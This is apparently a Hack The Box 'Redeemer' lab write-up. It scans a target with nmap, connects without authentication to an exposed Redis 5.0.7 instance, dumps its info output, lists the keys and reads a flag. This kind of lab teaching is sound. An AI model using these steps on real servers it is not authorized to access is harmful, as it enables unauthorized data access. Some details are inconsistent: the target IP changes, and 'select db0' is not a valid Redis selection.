# Redeemer
#startingpoint 
#veryeasy 
#redis

Firstly, we start by opening a VPN connection and launching the VM on HTB.
### Reconnaissance
The first step in any penetration test is to gather information about the target system. In this case, we are trying to identify open ports and services on the target host with the IP address 10.129.193.6. We use the `nmap -p- -sV $TARGET` command with the `-p-` option to scan all possible TCP ports and the `-sV` option to display service version information. The output shows that there is one open port,  port 6379 running redis service in the version 5.07.

```
Nmap scan report for 10.129.56.92
Host is up (0.045s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
### Redis Service
Since we found redis running in a open port, we try to connect to it using the `redis-cli -h $TARGET` command. We enter the target host's IP address. Once we are in the redis terminal we can run `info` to retrieve various information about the Redis instance, including its version, uptime, memory usage, and configuration file path. The output shows that the Redis instance is running version 5.0.7, has been running for 730 seconds (or approximately 12 minutes), uses 859624 bytes of memory (with a peak usage of 859624 bytes), and has a configuration file located at `/etc/redis/redis.conf`. Also it shows that there is a keyspace on index 0 which contains 4 keys.

```
10.129.56.92:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:746
run_id:ec1866fe33993dbe667d3c17a610f606e35dcfec
tcp_port:6379
uptime_in_seconds:730
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5630188
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5947392
used_memory_rss_human:5.67M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1613720
allocator_active:1949696
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.21
allocator_frag_bytes:335976
allocator_rss_ratio:4.70
allocator_rss_bytes:7208960
rss_overhead_ratio:0.65
rss_overhead_bytes:-3211264
mem_fragmentation_ratio:7.27
mem_fragmentation_bytes:5129776
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:4
rdb_bgsave_in_progress:0
rdb_last_save_time:1700128274
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:6
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:320
total_net_output_bytes:14861
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:4de0796cde5d7a5a2b38afdb4ae1438e3b61a0f4
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.497178
used_cpu_user:0.436640
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0

```
Now that we know that there is a keyspace called `db0` we can get the keys and values that it contains but first we need to select it, to do this we run `select db0`.
Once selected we can get all the keys by running `keys *` command. The output shows that there are four keys in the database: "temp", "numb", "flag", and "stor".
`
```
10.129.56.92:6379> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

Finally, we can run the `get flag` command to retrieve the value of the "flag" key, which returns the flag value that we need.